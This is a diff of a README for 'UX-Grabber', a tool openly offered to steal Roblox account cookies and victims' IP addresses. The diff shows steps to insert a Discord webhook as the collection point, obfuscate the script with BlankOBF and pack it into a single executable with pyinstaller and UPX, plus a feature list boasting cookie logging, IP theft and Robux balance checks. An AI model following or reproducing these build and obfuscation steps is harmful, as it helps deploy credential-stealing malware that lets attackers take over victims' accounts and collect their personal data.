@@ -2,28 +2,28 @@
   UX-Grabber 🍪 
 </h1>
 
-# Instructions:
+## Instructions:
 
 ### Replace this
 
 ```py
-webhook = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+webhook = "here"
 ```
 ### For ur own webhook
 
-#### Install py2exe
+#### Install pyinstaller
 ```bash
-$ pip install py2exe
+$ pip install pyinstaller
 ```
 
-#### Obfuscation
+#### Obfuscation   [BlankOBF Github](https://github.com/Blank-c/BlankOBF)
 ```bash
-$ python O1.py main.py
+$ py BlankOBF.py main.py
 ```
 
-#### Run setup.py
+#### Build + UPX  [UPX Github](https://github.com/upx/upx)
 ```bash
-$ python setup.py py2exe
+$ pyinstaller --onefile --clean --i NONE Obfuscated_main.py
 ```
 
 #### Install requirements
@@ -34,9 +34,7 @@ $ pip install -r requirements.txt
 - Features.
   - Log Roblox Cookies ✔
   - Check if they are premium ✔
-  - Check Account Age ✔
   - Steals IP ✔
-  - Finds their address ✔
   - Check their robux balance ✔
   - Obfuscation ✔
   - And more ✔
